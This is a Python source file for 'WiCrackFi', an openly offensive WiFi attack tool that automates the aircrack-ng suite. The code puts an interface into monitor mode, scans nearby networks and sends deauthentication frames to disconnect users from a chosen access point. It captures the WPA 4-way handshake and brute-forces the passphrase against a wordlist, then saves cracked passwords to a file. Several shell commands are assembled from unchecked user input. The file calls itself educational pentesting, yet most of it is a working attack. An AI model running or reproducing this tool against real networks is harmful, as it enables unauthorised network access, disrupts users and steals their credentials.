# ====================================================================================================================
#                                                   WiCrackFi
#                                                     v1.2
#                           WiFi Security Testing Tool Created By Pedro "ShineZex" Gomes
#                                       Copyright 2021 - All Rights Reserved
# ====================================================================================================================
# WiFi Security Testing Tool that automates the use of Aircrack-ng suit and makes testing WiFi Security much easier!
# ====================================================================================================================
import os
import time
import subprocess
import shlex
import os.path
import csv
import datetime


# Setup (updates and installs)
def instal_setup():
    os.system("clear")
    print("Installing everything that is required:")
    time.sleep(2)
    print("Updating...")
    os.system("sudo apt-get update")
    time.sleep(1)
    os.system("clear")
    print("Upgrading...")
    os.system("sudo apt-get upgrade")
    time.sleep(1)
    os.system("clear")
    print("Installing Aircrack-ng...")
    os.system("sudo apt-get install aircrack-ng")
    time.sleep(1)
    print("FINISHED!")
    print("EVERYTHING THAT IS NEEDED IS INSTALLED! HAVE FUN!")
    time.sleep(2)
    os.system("clear")
    menu()


# Starts the interface in monitor mode
def start_monitor_mode():
    os.system('clear')
    print("Your network interfaces are...")
    # This line is just to make sure there is no bugs, restarts all the connections to run in a fresh environment
    os.system('service networking restart')
    time.sleep(3)
    os.system("airmon-ng")
    time.sleep(.5)
    # Debugs
    os.system("airmon-ng check kill")
    time.sleep(.5)
    i = input("Enter your network interface: ")
    time.sleep(.5)
    os.system("airmon-ng stop " + i + "mon")
    time.sleep(.5)
    command = "airmon-ng start " + i
    os.system(command)
    time.sleep(.5)
    # Debugs
    os.system("airmon-ng check kill")
    # Creates a dir to store all the config files (more organized)
    if not os.path.exists('configs'):
        os.system("mkdir configs")
    # Saves the interface name in a file to use multiple times in the script later
    l = open("configs/NODELETE.txt", "w")
    l.write(i + "mon")
    l.close()
    time.sleep(1)
    print("DONE!")
    time.sleep(.5)
    os.system("clear")
    menu()


# Clean File
def clean_indv():
    os.system("mv configs/WiFi__List-01.csv configs/WiFi__List-00.csv")
    # Cleans all the devices info, only shows the networks available
    # Cleans first blank line of the file
    os.system("sed '/Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs/,$d' "
              "configs/WiFi__List-00.csv > configs/WiFi__List-01.csv; sed -i '1d' configs/WiFi__List-01.csv")

    os.system("rm -rf configs/WiFi__List-00.csv")
    menu()


# If wifi list not created, creates a new one
def networks_arround():
    l = open("configs/NODELETE.txt", "r")
    il = l.read()
    time.sleep(.5)
    # Creates a dir to store all the config files (more organized)
    if not os.path.exists('configs'):
        os.system("mkdir configs")

    # Check if exists any older file and if yes removes it
    if os.path.exists('configs/WiFi__List-01.csv'):
        os.system("rm -rf configs/WiFi__List-*")

    # Command to get the networks around info
    command = "airodump-ng -w configs/WiFi__List --output-format csv wlan0mon"

    # Starts a subprocess to kill the airmon-ng command after 5 seconds
    process = subprocess.Popen(shlex.split(command), stdout=subprocess.PIPE)
    time.sleep(1)
    while True:
        # After some testing, 7 seconds is the perfect number between fast process and most networks collected.
        for x in range(7, 0, -1):
            os.system("clear")
            print("SCANNING FOR WIFIs | FINISH IN: " + str(x) + "s")
            time.sleep(1)

        process.kill()
        os.system("clear")
        os.system("reset")
        os.system("clear")
        print("WIFI LIST FILE CREATED!")
        break

    time.sleep(1)
    l.close()
    clean_indv()


# Just to display the saved networks
def display_networks_available():
    os.system("clear")
    # Creates a dir to store all the config files (more organized)
    if not os.path.exists('configs'):
        os.system("mkdir configs")
    # Checks if the file already exists
    if os.path.exists('configs/WiFi__List-01.csv'):
        # Prints a table using the import csv with all the ESSID of the networks discouvered
        print("")
        print("=========================================================")
        print("|		" + "\033[1m" + "List of Available Networks:" + "\033[0m" + "	 	|")
        print("=========================================================")
        print(
            "|   " + "\033[1m" + "No" + "\033[0m" + "	|	     " + "\033[1m" + "BSSID" + "\033[0m" +
            "		|	" + "\033[1m" + "ESSID" + "\033[0m" + "	|")
        print("=========================================================")
        # Used to print the number of lines
        n = 1
        # Opens the csv file in Dictionary mode
        with open('configs/WiFi__List-01.csv') as csvfile:
            reader = csv.DictReader(csvfile)
            for row in reader:
                print("|   " + str(n) + "	|	" + row['BSSID'] + "	|    " + row[' ESSID'] + " ")
                n += 1
        print("==========================================================")
        menu()
    else:
        print("\n")
        print("THERE IS NO WIFI LIST CREATED..\n")
        print("CREATING A NEW WIFI LIST OF THE AVAILABLE NETWORKS ARROUND\n")
        time.sleep(1)
        networks_arround()


# This function is similar to the display_networks_available, however do not redirect to the menu()
def display_handshake():
    os.system("clear")
    # Creates a dir to store all the config files (more organized)
    if not os.path.exists('configs'):
        os.system("mkdir configs")
    # Checks if the file already exists
    if os.path.exists('configs/WiFi__List-01.csv'):
        # Prints a table using the import csv with all the ESSID of the networks discouvered
        print("")
        print("=========================================================")
        print("|		" + "\033[1m" + "List of Available Networks:" + "\033[0m" + "	 	|")
        print("=========================================================")
        print(
            "|   " + "\033[1m" + "No" + "\033[0m" + "	|	     " + "\033[1m" + "BSSID" + "\033[0m" + "		|	" + "\033[1m" + "ESSID" + "\033[0m" + "	|")
        print("=========================================================")
        # Used to print the number of lines
        n = 1
        # Opens the csv file in Dictionary mode
        with open('configs/WiFi__List-01.csv') as csvfile:
            reader = csv.DictReader(csvfile)
            for row in reader:
                print("|   " + str(n) + "	|	" + row['BSSID'] + "	|    " + row[' ESSID'] + " ")
                n += 1
        print("=========================================================")

    else:
        print("\n")
        print("THERE IS NO WIFI LIST CREATED..\n")
        print("CREATING A NEW WIFI LIST OF THE AVAILABLE NETWORKS ARROUND\n")
        time.sleep(1)
        networks_arround()


# Setup to colect the Handshake on the selected WIFI
def capture_handshake():
    # Show list of available networks to strat handshake
    display_handshake()

    try:
        network = input("Input the number of the Network you want to try a Handshake: ")

        # Count how many networks exists
        file_name = "configs/WiFi__List-01.csv"
        count = 0
        with open(file_name, 'r') as f:
            for line in f:
                count += 1

        # Next line is because the networks file is always created with the first line (info) and a blank line in the end
        count = count - 2

        # Checks if the number typed by the user is correct (inside the range of networks available)
        if 1 <= int(network) < (count + 1):

            l = open("configs/NODELETE.txt", "r")
            il = l.read()
            time.sleep(.5)

            f = input("Name of the file that will be generated by airodump-ng: ")

            dea = input("How many times do you want to deauthenticate the users: ")

            # Opens the WiFi list file and creates an object/array for later be used
            fil = open("configs/WiFi__List-01.csv")
            csv_f = list(csv.reader(fil))

            # Assigns the correct network to get the MAC and Channel values later
            position = (int(network))

            # Gets the values of the MAC Address and the Channel from the file
            bs = csv_f[position][0]
            c = csv_f[position][3]

            # CREATES THE DEAUTH FILE - Later is called to execute in a separate terminal
            deauth_net = "aireplay-ng --deauth " + dea + " -a " + bs + " " + il

            # HANDSHAKE
            # Creates a dir to store all the airodump-ng files (more organized)
            if not os.path.exists('airodump_files'):
                os.system("mkdir airodump_files")

            # This next process is to make sure the files get more organized and with "unique" names
            dtime = datetime.datetime.now().strftime("%Y-%m-%d_%H_%M_%S")
            airmondir = "" + f + "_" + dtime
            os.system("mkdir airodump_files/" + airmondir + "")

            # Handshake Try Command
            command = "airodump-ng -w airodump_files/" + airmondir + "/" + f + " --bssid " + bs + " -c " + c + " --write-interval 1 " + il

            # Test Command
            # command = "airodump-ng -w WiFi__List --output-format csv --write-interval 1 wlan0mon"

            # Closes the NODELETE.txt file
            l.close()

            # Sends the airodump command , the aireplay command and send the name of the file created with it (f)
            run_subcommand(command, f, airmondir, deauth_net)

        else:
            print("Please input a possible option.")
            time.sleep(1)
            capture_handshake()

    except:
        print("Error? Rewinding... :)")
        time.sleep(1)
        capture_handshake()


# Capture the Handshake on the selected WIFI
def run_subcommand(command, f, airmondir, deauth_net):
    # Executes the subprocess with the command sent by the previous function (the airodump-ng command)
    process = subprocess.Popen(shlex.split(command))

    # Executes the subprocess with the deauth_net command sent by the previous function (the airplay-ng command)
    deauthprocess = subprocess.Popen(shlex.split(deauth_net))

    # Will keep the subprocess running until the process.kill is found
    while True:

        # Use tcpdump function to read the .cap file created and outputs to an external file only the EAPOL packets
        # Although this command is very good for this purpose we were not getting 100% sure if the 4th message of the 4 way-handshake (4WHS) was successfully delivered..
        # And even tho in order to be successfull we only need messages 2 and 3 or 3 and 4.. just to make sure we get a full 4WHS it's better to use tshark.
        # os.system("tcpdump -r wifi-01.cap ether proto 0x888e > cap.txt &")

        # Use tshark to get more informtion about the packets and print them on the cap.txt file (with tshark we get the number of the messages info)
        # Make sure the 4WHS is 100% successfull with the 4th message delivered..
        # tshark = "tshark -r "+f+"-01.cap | grep 'Key (Message 4 of 4)' > cap.txt"
        os.system(
            "tshark -r airodump_files/" + airmondir + "/" + f + "-01.cap | grep 'Key (Message 4 of 4)' > airodump_files/" + airmondir + "/fourwhs.txt")
        time.sleep(0.5)

        # Just check how many lines the new file has
        nlines = len(open("airodump_files/" + airmondir + "/fourwhs.txt").readlines())

        # If the number of lines is >= 1 (1 packet of EAPOL with Message 4 of 4) executes the commands
        if nlines >= 1:
            # Kill the deauth subprocess running
            deauthprocess.kill()
            time.sleep(0.5)

            # Kill the subprocess running
            process.kill()

            # Cleans the directory files
            os.system("rm -rf airodump_files/" + airmondir + "/fourwhs.txt")

            # Next couple commands are just to make the terminal output clean and not bugged (sometimes the terminal after this stage became bugged and had to reset to get it normal again
            os.system("reset")
            os.system("clear")
            print("=========================================================")
            print("|		   " + "\033[1m" + "HANDSHAKE ACHIEVED!" + "\033[0m" + "			|")
            print("=========================================================")
            print("|On File: " + airmondir + "/" + f + "-01.cap	 |")
            print("=========================================================\n")
            print("Do you want to crack this network now?")
            break
    # The while breaks and redirect the user to the cracking function
    crack_q(f, airmondir)


# Function to ask the user if he wants to crack the wifi or not
def crack_q(f, airmondir):
    # Write a file if it doesn't exist already with the header, later we call the collumns by the headers
    file_name = "configs/cracks_list.csv"
    if not os.path.exists('configs/cracks_list.csv'):
        with open(file_name, 'w') as write_obj:
            # Creates a object to write on it later
            newFileWriter = csv.writer(write_obj)
            newFileWriter.writerow(['DIR'])
            write_obj.close()

    # Add the wifi with handshake colected to a list
    with open(file_name, 'a') as write_obj:
        # Creates a object to write on it later
        newFileWriter = csv.writer(write_obj)

        direc = "" + airmondir + "/" + f + "-01.cap"
        newFileWriter.writerow([direc])
        # Close the object (file)
        write_obj.close()

    try:
        crack = input("Y/N?: ").lower()
        if crack.startswith('y'):
            os.system("clear")
            crack_wifi()
        if crack.startswith("n"):
            os.system("clear")
            menu()
        else:
            print("Please input a possible option.")
            time.sleep(1)
            crack_q(f, airmondir)

    except:
        print("Please input a possible option.")
        time.sleep(1)
        crack_q(f, airmondir)


# Crack Menu
def crack_wifi():
    ##AIRCRACK MENU
    print("")
    print("=========================================================")
    print("|		    " + "\033[1m" + "CRACKING MENU" + "\033[0m" + "			|")
    print("=========================================================")
    print("|   1	|Crack a saved 4WHS Network			|")
    print("|   2	|Wordlist Menu					|")
    print("|   3	|Show Saved WiFI Passwords			|")
    print("|   4	|Back to the Main Menu				|")
    print("=========================================================")

    try:
        cw = input("Type your option: ")

        if cw == "1":
            os.system("clear")
            option = 1
            selectwordlist(option)
        elif cw == "2":
            wordlist()
        elif cw == "3":
            show_passlist()
        elif cw == "4":
            os.system("clear")
            menu()
        else:
            print("Please input a possible option.")
            time.sleep(1)
            crack_wifi()

    except IndexError:
        print("Please input a possible option.")
        time.sleep(1)
        crack_wifi()


# Wordlist Menu
def wordlist():
    os.system("clear")
    print("")
    print("=========================================================")
    print("|		   " + "\033[1m" + "WORDLIST MENU" + "\033[0m" + "			|")
    print("=========================================================")
    print("|   1	|Append your desired words to a wordlist	|")
    print("|   2	|Save a new directory of your wordlist		|")
    print("|   3	|Back to the Crack Menu				|")
    print("=========================================================")

    try:
        cw = input("Type your option: ")

        if cw == "1":
            os.system("clear")
            option = 0
            selectwordlist(option)
        elif cw == "2":
            os.system("clear")
            addwordlist()
        elif cw == "3":
            os.system("clear")
            crack_wifi()
        else:
            print("Please input a possible option.")
            time.sleep(1)
            wordlist()

    except:
        print("Please input a possible option.")
        time.sleep(1)
        wordlist()


# Show list of wordlists saved
def selectwordlist(option):
    os.system("clear")
    # Creates a dir to store all the config files (more organized)
    if not os.path.exists('configs'):
        os.system("mkdir configs")

    file_name = "configs/wordlist_list.csv"
    # Creates a wordlist file to store saved wordlists
    if not os.path.exists('configs/wordlist_list.csv'):
        # Open file in write mode
        with open(file_name, 'w') as write_obj:
            newFileWriter = csv.writer(write_obj)
            newFileWriter.writerow(['NAME'])
            newFileWriter.writerow(['/usr/share/wordlists/rockyou.txt'])
            write_obj.close()

    # Checks if the file already exists
    if os.path.exists('configs/wordlist_list.csv'):
        # Prints a table using the import csv with all the ESSID of the networks discouvered
        print("")
        print("=========================================================")
        print("|	   " + "\033[1m" + "List of Saved Wordlists:" + "\033[0m" + "	 		|")
        print("=========================================================")
        print(
            "|   " + "\033[1m" + "No" + "\033[0m" + "	|	         " + "\033[1m" + "Wordlist Name" + "\033[0m" + "			|")
        print("=========================================================")
        # Used to print the number of lines
        n = 1
        # Opens the csv file in Dictionary mode to call the columns by the headers
        with open('configs/wordlist_list.csv') as csvfile:
            reader = csv.DictReader(csvfile)
            for row in reader:
                print("|   " + str(n) + "	|    " + row['NAME'] + "		|")
                n += 1
        print("=========================================================")
        if option == 1:
            selected_wordlists_crack()
        elif option == 0:
            selected_wordlists_append()
        else:
            print("Error? Rewinding... :)")
            wordlist()
    else:
        print("No Saved Wordlists.")
        time.sleep(1)
        menu()


# Select the wordlist the user wnats to add a new (own) word to the tool
def selected_wordlists_append():
    try:
        swrdlist = input("Select which Wordlist you want to use: ")

        # Count how many networks exists
        file_name = "configs/wordlist_list.csv"
        count = 0
        with open(file_name, 'r') as f:
            for line in f:
                count += 1

        # Next line is because the networks file is created with a first line (info)
        count -= 1

        # Checks if the number typed by the user is correct (inside the range of networks available)
        if 1 <= int(swrdlist) <= count:

            # Opens the wordlist file and creates an object/array for later be used
            fil = open("configs/wordlist_list.csv")
            swrd = list(csv.reader(fil))

            # Assigns the correct network to get the MAC and Channel values later
            position = (int(swrdlist))

            # Gets the values of the Name of the Wordlist from the file
            bs = swrd[position][0]

            # Sends the wordlist to the function appendwords
            appendwords(bs)

        else:
            print("Please input a possible option.")
            time.sleep(1)
            selected_wordlists_append()

    except:
        print("Error? Rewinding... :)")
        time.sleep(1)
        menu()


# Select the wordlist the user wants to use to crack the wifi
def selected_wordlists_crack():
    try:
        swrdlist = input("Select which Wordlist you want to use: ")

        # Count how many networks exists
        file_name = "configs/wordlist_list.csv"
        count = 0
        with open(file_name, 'r') as f:
            for line in f:
                count += 1

        # Next line is because the networks file is created with a first line (info)
        count = count - 1

        # Checks if the number typed by the user is correct (inside the range of networks available)
        if 1 <= int(swrdlist) <= (count):

            # Opens the 4WHS network list file and creates an object/array for later be used
            fil = open("configs/wordlist_list.csv")
            swrd = list(csv.reader(fil))

            # Assigns the correct network to get the MAC and Channel values later
            position = (int(swrdlist))

            # Gets the values of the Name of the Wordlist from the file
            wrdlistname = swrd[position][0]

            # Sends the wordlist to the function cracknow
            cracknow(wrdlistname)

        else:
            print("Please input a possible option.")
            time.sleep(1)
            selected_wordlists_crack()

    except:
        print("Error? Rewinding... :)")
        time.sleep(1)
        menu()


# Function to append new (own) words to the default wordlist (rockyou.txt)
def appendwords(bs):
    # rockyou.txt link
    # https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
    # rockyou kali normal dir: /usr/share/wordlists/rockyou.txt
    print("By default the wordlist used is /usr/share/wordlists/rockyou.txt")
    print("All words you type here will be appended to rockyou.txt.\n")
    print("If you don't have the rockyou.txt wordlist go to:")
    print("https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz\n")
    print("If you would like to add more than 1 word at the same time, we sugest you")
    print("to go directly to the rockyou.txt file and add everything you would like.\n")

    print(bs)

    try:
        aw = input("Type only 1 word you would like to add (no spaces): ")

        # Append on the first line the word typed by the user on the rockyou.txt file
        os.system("sed '1 i " + aw + "' -i " + bs + "")

        print("")
        print("WORD ADDED!")
        time.sleep(1)
        wordlist()

    except:
        print("Error, couldn't add new word.")
        time.sleep(1)
        appendwords(bs)


# Add a new wordlist
def addwordlist():
    os.system("clear")
    print("Type the FULL directory of your wordlist.\n")
    try:
        savewrdlist = input("FULL Directory (eg: /usr/share/wordlists/rockyou.txt): ")

        file_name = "configs/wordlist_list.csv"

        # Creates a wordlist file to store saved wordlists if it doesn't exist already and writes the
        # header and the default wordlist used in this tool
        if not os.path.exists('configs/wordlist_list.csv'):
            # Open file in write mode
            with open(file_name, 'w') as write_obj:
                newFileWriter = csv.writer(write_obj)
                newFileWriter.writerow(['NAME'])
                newFileWriter.writerow(['/usr/share/wordlists/rockyou.txt'])
                write_obj.close()

        # If the wordlist file already exists append the new wordlist typed by the user
        if os.path.exists('configs/wordlist_list.csv'):
            # Open file in append mode
            with open(file_name, 'a') as write_obj:
                newFileWriter = csv.writer(write_obj)
                newFileWriter.writerow([str(savewrdlist)])
                write_obj.close()

            print("")
            print("WORDLIST SAVED TO THE TOOL!")
            print("YOU CAN USE IT NOW TO CRACK PASSWORDS!")
            time.sleep(1)
            wordlist()

    except:
        print("Error, couldn't add new wordlist.")
        time.sleep(1)
        addwordlist()


# Show the available wifi that already colected a 4WHS
def cracknow(wrdlistname):
    os.system("clear")
    # Checks if the file already exists
    if os.path.exists('configs/cracks_list.csv'):
        # Prints a table using the import csv with all the Directories of the networks that colected a 4WHS
        print("")
        print("=========================================================")
        print("|	   " + "\033[1m" + "List of Available Networks to Crack:" + "\033[0m" + "	 	|")
        print("=========================================================")
        print(
            "|   " + "\033[1m" + "No" + "\033[0m" + "	|	              " + "\033[1m" + "DIR" + "\033[0m" + "			|")
        print("=========================================================")
        # Used to print the lines
        n = 1
        # Opens the csv file in Dictionary mode
        with open('configs/cracks_list.csv') as csvfile:
            reader = csv.DictReader(csvfile)
            for row in reader:
                print("|   " + str(n) + "	|    " + row['DIR'] + "	|")
                n += 1
        print("=========================================================")
        selected_crack(wrdlistname)
    else:
        print("No Available Networks to Crack.")
        time.sleep(1)
        menu()


# Crack the wifi
def selected_crack(wrdlistname):
    try:
        cwif = input("Select which Network you want to crack: ")

        # Count how many networks exists
        file_name = "configs/cracks_list.csv"
        count = 0
        with open(file_name, 'r') as f:
            for line in f:
                count += 1

        # Next line is because the networks file is created with a first line (info)
        count = count - 1

        # Checks if the number typed by the user is correct (inside the range of networks available)
        if 1 <= int(cwif) <= (count):

            # Opens the 4WHS network list file and creates an object/array for later be used
            fil = open("configs/cracks_list.csv")
            csv_cf = list(csv.reader(fil))

            # Assigns the correct network to get the MAC and Channel values later
            position = (int(cwif))

            # Gets the values of the DIR from the file
            directory = csv_cf[position][0]

            # Bruteforces the password
            os.system("aircrack-ng airodump_files/" + directory + " -w " + wrdlistname + " > configs/passcrack.csv")

            # Count how many lines exist to get the line of the password
            passcrack = "configs/passcrack.csv"
            count = 0
            with open(passcrack, 'r') as f:
                for line in f:
                    count += 1
            # The line that has the password is the second last
            posi = count - 1

            file_name_pass = "configs/passlist.csv"
            # Creates a passlist file to store saved password found
            if not os.path.exists('configs/passlist.csv'):
                # Open file in append mode
                with open(file_name_pass, 'w') as write_obj:
                    newFileWriter = csv.writer(write_obj)
                    newFileWriter.writerow(['ESSID', 'BSSID', 'PASSWORD', 'DATE'])
                    write_obj.close()

            os.system("clear")

            # Password of the WiFi
            os.system("awk 'NR == " + str(posi) + " {print $4}' configs/passcrack.csv > configs/passtemp.csv")

            # Name of the WiFi (ESSID)
            os.system("awk 'NR == 7 {print $3}' configs/passcrack.csv >> configs/passtemp.csv")

            # MAC of the WiFi (BSSID)
            os.system("awk 'NR == 7 {print $2}' configs/passcrack.csv >> configs/passtemp.csv")

            # Opens the Pass list file and creates an object/array for later be used
            temppass = open("configs/passtemp.csv", "r")
            passtemp = list(csv.reader(temppass))

            # Gets the values of the Password, ESSID and BSSID of the wifi
            pssw = passtemp[0][0]
            essid = passtemp[1][0]
            bssid = passtemp[2][0]
            datet = dtime = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")

            # Writing on a file to later be able to display only the ESSID and Password
            with open(file_name_pass, 'a') as write_obj:
                newFileWriter = csv.writer(write_obj)
                newFileWriter.writerow([essid, bssid, pssw, datet])
                write_obj.close()

            temppass.close()

            os.system("clear")
            print("")
            print("=========================================================")
            print("|		    " + "\033[1m" + "PASSWORD FOUND!" + "\033[0m" + "			|")
            print("=========================================================")
            print("|		" + "\033[1m" + "DATE: " + datet + " " + "\033[0m" + "			|")
            print("|		" + "\033[1m" + "ESSID: " + essid + " " + "\033[0m" + "			|")
            print("|		" + "\033[1m" + "BSSID: " + bssid + " " + "\033[0m" + "		|")
            print("|		" + "\033[1m" + "PASSWORD: " + pssw + " " + "\033[0m" + "			|")
            print("=========================================================")

            # Clean temp files to make it more organized
            os.system("rm -rf configs/passcrack.csv")
            os.system("rm -rf configs/passtemp.csv")

            menu()

        else:
            print("Please input a possible option.")
            time.sleep(1)
            selected_crack(wrdlistname)

    except:
        print("Error? Rewinding... :)")
        time.sleep(1)
        menu()


# Show the list of passwords already cracked and saved on the tool
def show_passlist():
    os.system("clear")
    # Checks if the file already exists
    if os.path.exists('configs/passlist.csv'):
        # Prints a table using the import csv with the ESSID, BSSID and Passwords of the passwords discouvered
        print("")
        print("=================================================================================")
        print("|	   		  " + "\033[1m" + "List of Saved WiFi Passwords:" + "\033[0m" + "	 			|")
        print("=================================================================================")
        print(
            "|        " + "\033[1m" + "DATE" + "\033[0m" + "	      |      " + "\033[1m" + "ESSID" + "\033[0m" + "	|        " + "\033[1m" + "BSSID" + "\033[0m" + "        |    " + "\033[1m" + "PASSWORD" + "\033[0m" + "   	|")
        print("=================================================================================")

        # Opens the csv file in Dictionary mode
        with open('configs/passlist.csv') as csvfile:
            reader = csv.DictReader(csvfile)
            for row in reader:
                print("|  " + row['DATE'] + "   |   " + row['ESSID'] + "  |  " + row['BSSID'] + "  |   " + row[
                    'PASSWORD'] + "	|")

        print("=================================================================================")
        crack_wifi()
    else:
        print("No Saved WiFi Passwords.")
        time.sleep(1)
        crack_wifi()


# Clean menu
def clean_options():
    os.system("clear")
    print("")
    print("=========================================================")
    print("|		    " + "\033[1m" + "CLEAN FILES MENU" + "\033[0m" + "			|")
    print("=========================================================")
    print("|   1	|Clean Outdated WiFi Networks List		|")
    print("|   2	|Clean all Airodump-ng Files			|")
    print("|   3	|Clean Saved Wordlists				|")
    print("|   4	|Clean Saved WiFI Passwords			|")
    print("|   5	|Back to the Main Menu				|")
    print("=========================================================")

    try:
        cf = input("Type your option: ")

        if cf == "1":
            os.system("rm -rf configs/WiFi__List-01.csv")
            print("Outdated WiFi Networks List Cleaned")
            time.sleep(1)
            os.system("clear")
            clean_options()
        elif cf == "2":
            os.system("rm -rf airodump_files")
            os.system("rm -rf configs/cracks_list.csv")
            print("Airodump-ng Files Cleaned")
            time.sleep(1)
            os.system("clear")
            clean_options()
        elif cf == "3":
            os.system("rm -rf configs/wordlist_list.csv")
            print("Saved Wordlists Cleaned")
            time.sleep(1)
            os.system("clear")
            clean_options()
        elif cf == "4":
            os.system("rm -rf configs/passlist.csv")
            print("Saved WiFI Passwords Cleaned")
            time.sleep(1)
            os.system("clear")
            clean_options()
        elif cf == "5":
            os.system("clear")
            menu()
        else:
            print("Please input a possible option.")
            time.sleep(1)
            clean_options()

    except:
        print("Please input a possible option.")
        time.sleep(1)
        clean_options()


# Info page
def info_page():
    os.system("clear")
    print("")
    print("\033[31m" + "\033[1m" + "	    WIFI HACKING - AUTOMATING SCRIPT" + "\033[0m")
    print("=========================================================")
    print("|	   " + "\033[1m" + "INFO | INSTRUCTIONS | DISCLAIMERS" + "\033[0m" + "		|")
    print("=========================================================")
    print("\033[1m" + "INFO\n" + "\033[0m")
    print("This tool was developed to automate the process of conducting")
    print("a PenTest on WiFi Networks with Aircrack-ng in Python.\n")
    print("\033[1m" + "INSTRUCTIONS\n" + "\033[0m")
    print("For this tool to work in the best possible way")
    print("please follow these instructions:")
    print("		- Execute Option 2 in the Main Menu.")
    print("		- Try to use the tool functionalities, ")
    print("		    preferably don't clean files manually.\n")
    print("\033[1m" + "DISCLAIMERS\n" + "\033[0m")
    print("-This tool was tested/created in a fully updated Kali Linux")
    print("		Virtual Machine (VMWare).")
    print("-Aircrack-ng need to be installed (Option 1 in Main Menu).")
    print("-WiFi Card used to run in monitor mode was an ALFA AWUS036NHA.")
    print("-This tool uses rockyou.txt wordlist to do cracking by default.")
    print("-This tool is for educational purposes only.")
    print("-This tool was created by Pedro 'ShineZex' Gomes.\n")
    menu()


# Main Menu
def menu():
    print("")
    print("\033[31m" + "\033[1m" + "	    WIFI HACKING - AUTOMATING SCRIPT" + "\033[0m")
    print("=========================================================")
    print("|		    " + "\033[1m" + "AVAILABLE OPTIONS:" + "\033[0m" + "			|")
    print("=========================================================")
    print("|   0	|Informations, Instructions and Disclaimers	|")
    print("|   1	|Install all that is required			|")
    print("|   2	|Start/Restart interface in mon(itor) mode	|")
    print("|   3	|Clean Files Created (Options)			|")
    print("|   4	|See all networks saved				|")
    print("|   5	|Try Handshake / Deauth and Crack the WiFi	|")
    print("|   6	|Cracking Menu / Wordlist Menu			|")
    print("|   99	|Exit 						|")
    print("=========================================================")

    try:
        a = input("Type your option: ")

        if a == "0":
            info_page()
        elif a == "1":
            instal_setup()
        elif a == "2":
            start_monitor_mode()
        elif a == "3":
            clean_options()
        elif a == "4":
            display_networks_available()
        elif a == "5":
            capture_handshake()
        elif a == "6":
            crack_wifi()
        elif a == "99":
            os._exit(0)
        else:
            print("Please input a possible option.")
            time.sleep(1)
            menu()

    except:
        print("Please input a possible option.")
        time.sleep(1)
        menu()


# coding=utf-8
print(r"""    
 __      ______________                       __   ______________ 
/  \    /  \__\_   ___ \____________    ____ |  | _\_   _____/|__|
\   \/\/   /  /    \  \/\_  __ \__  \ _/ ___\|  |/ /|    __)  |  |
 \        /|  \     \____|  | \// __ \\  \___|    < |     \   |  |
  \__/\  / |__|\______  /|__|  (____  /\___  >__|_ \\___  /   |__|
       \/             \/            \/     \/     \/    \/        
    """)
menu()
